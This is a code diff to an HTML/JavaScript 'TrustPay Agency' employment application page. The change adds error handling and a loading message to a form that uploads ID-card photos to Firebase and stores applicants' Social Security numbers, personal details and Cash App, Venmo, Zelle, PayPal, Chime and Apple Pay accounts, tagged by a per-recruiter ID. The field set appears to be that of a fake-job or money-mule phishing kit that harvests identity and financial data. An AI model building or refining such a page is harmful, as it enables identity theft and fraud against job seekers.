@@ -98,91 +98,102 @@
             document.getElementById('applicationForm').addEventListener('submit', async (e) => {
                 e.preventDefault(); // Prevent default form submission
 
+                // Show loading message
+                document.getElementById('loadingMessage').style.display = 'block';
+
                 const formData = new FormData(e.target);
                 const idCardFront = formData.get('idCardFront');
                 const idCardBack = formData.get('idCardBack');
 
-                // Upload images to Firebase Storage
-                const frontImageRef = storage.ref(`idCards/${idCardFront.name}`);
-                const backImageRef = storage.ref(`idCards/${idCardBack.name}`);
-                await frontImageRef.put(idCardFront);
-                await backImageRef.put(idCardBack);
+                try {
+                    // Upload images to Firebase Storage
+                    const frontImageRef = storage.ref(`idCards/${idCardFront.name}`);
+                    const backImageRef = storage.ref(`idCards/${idCardBack.name}`);
+                    await frontImageRef.put(idCardFront);
+                    await backImageRef.put(idCardBack);
 
-                // Get download URLs
-                const frontImageUrl = await frontImageRef.getDownloadURL();
-                const backImageUrl = await backImageRef.getDownloadURL();
+                    // Get download URLs
+                    const frontImageUrl = await frontImageRef.getDownloadURL();
+                    const backImageUrl = await backImageRef.getDownloadURL();
 
-                // Save form data to Firestore with employer ID
-                await db.collection('applications').add({
-                    employerId: employerId, // Include employer ID
-                    fullName: formData.get('fullName'),
-                    dob: formData.get('dob'),
-                    gender: formData.get('gender'),
-                    address: {
-                        street: formData.get('address'),
-                        city: formData.get('city'),
-                        state: formData.get('state'),
-                        zip: formData.get('zip')
-                    },
-                    phone: formData.get('phone'),
-                    email: formData.get('email'),
-                    idCardFront: frontImageUrl,
-                    idCardBack: backImageUrl,
-                    ssn: formData.get('ssn'),
-                    banks: {
-                        cashapp: formData.get('cashapp'),
-                        venmo: formData.get('venmo'),
-                        zelle: formData.get('zelle'),
-                        paypal: formData.get('paypal'),
-                        chime: formData.get('chime'),
-                        applepay: formData.get('applepay')
-                    },
-                    employmentHistory: [
-                        {
-                            employer: formData.get('prevEmployer1'),
-                            position: formData.get('position1'),
-                            duration: formData.get('duration1'),
-                            reason: formData.get('reason1')
+                    // Save form data to Firestore with employer ID
+                    await db.collection('applications').add({
+                        employerId: employerId, // Include employer ID
+                        fullName: formData.get('fullName'),
+                        dob: formData.get('dob'),
+                        gender: formData.get('gender'),
+                        address: {
+                            street: formData.get('address'),
+                            city: formData.get('city'),
+                            state: formData.get('state'),
+                            zip: formData.get('zip')
                         },
-                        {
-                            employer: formData.get('prevEmployer2'),
-                            position: formData.get('position2'),
-                            duration: formData.get('duration2'),
-                            reason: formData.get('reason2')
-                        }
-                    ],
-                    education: {
-                        level: formData.get('education'),
-                        institution: formData.get('institution'),
-                        field: formData.get('field')
-                    },
-                    skills: formData.get('skills'),
-                    certifications: formData.get('certifications'),
-                    references: [
-                        {
-                            name: formData.get('reference1'),
-                            relationship: formData.get('relationship1'),
-                            phone: formData.get('refPhone1'),
-                            email: formData.get('refEmail1')
+                        phone: formData.get('phone'),
+                        email: formData.get('email'),
+                        idCardFront: frontImageUrl,
+                        idCardBack: backImageUrl,
+                        ssn: formData.get('ssn'),
+                        banks: {
+                            cashapp: formData.get('cashapp'),
+                            venmo: formData.get('venmo'),
+                            zelle: formData.get('zelle'),
+                            paypal: formData.get('paypal'),
+                            chime: formData.get('chime'),
+                            applepay: formData.get('applepay')
                         },
-                        {
-                            name: formData.get('reference2'),
-                            relationship: formData.get('relationship2'),
-                            phone: formData.get('refPhone2'),
-                            email: formData.get('refEmail2')
-                        }
-                    ],
-                    additionalInfo: {
-                        reason: formData.get('reason'),
-                        experience: formData.get('experience')
-                    },
-                    signature: formData.get('signature'),
-                    date: formData.get('date'),
-                    submittedAt: firebase.firestore.FieldValue.serverTimestamp() // Add timestamp
-                });
+                        employmentHistory: [
+                            {
+                                employer: formData.get('prevEmployer1'),
+                                position: formData.get('position1'),
+                                duration: formData.get('duration1'),
+                                reason: formData.get('reason1')
+                            },
+                            {
+                                employer: formData.get('prevEmployer2'),
+                                position: formData.get('position2'),
+                                duration: formData.get('duration2'),
+                                reason: formData.get('reason2')
+                            }
+                        ],
+                        education: {
+                            level: formData.get('education'),
+                            institution: formData.get('institution'),
+                            field: formData.get('field')
+                        },
+                        skills: formData.get('skills'),
+                        certifications: formData.get('certifications'),
+                        references: [
+                            {
+                                name: formData.get('reference1'),
+                                relationship: formData.get('relationship1'),
+                                phone: formData.get('refPhone1'),
+                                email: formData.get('refEmail1')
+                            },
+                            {
+                                name: formData.get('reference2'),
+                                relationship: formData.get('relationship2'),
+                                phone: formData.get('refPhone2'),
+                                email: formData.get('refEmail2')
+                            }
+                        ],
+                        additionalInfo: {
+                            reason: formData.get('reason'),
+                            experience: formData.get('experience')
+                        },
+                        signature: formData.get('signature'),
+                        date: formData.get('date'),
+                        submittedAt: firebase.firestore.FieldValue.serverTimestamp() // Add timestamp
+                    });
 
-                // Redirect to thanks.html
-                window.location.href = `thanks.html?employer=${employerId}`; // Include employer ID in the redirect
+                    // Redirect to thanks.html
+                    window.location.href = `thanks.html?employer=${employerId}`; // Include employer ID in the redirect
+                } catch (error) {
+                    console.error("Error submitting form: ", error);
+                    alert("There was an error submitting your application. Please try again.");
+                } finally {
+                    // Hide loading message
+                    document.getElementById('loadingMessage').style.display = 'none';
+                }
             });
         });
     </script>
@@ -192,6 +203,12 @@
 <div class="container">
     <img src="tpa.png" alt="TrustPay Agency Logo" style="height: 50px;">
     <h2>TrustPay Agency - Employment Application</h2>
+    
+    <!-- Loading message -->
+    <div id="loadingMessage" style="display: none; text-align: center; margin: 20px 0;">
+        <p>Loading, please wait...</p>
+    </div>
+
     <form id="applicationForm" action="#" method="POST" enctype="multipart/form-data">
         <h3>Personal Information</h3>
         <label for="fullName">Full Name:</label>
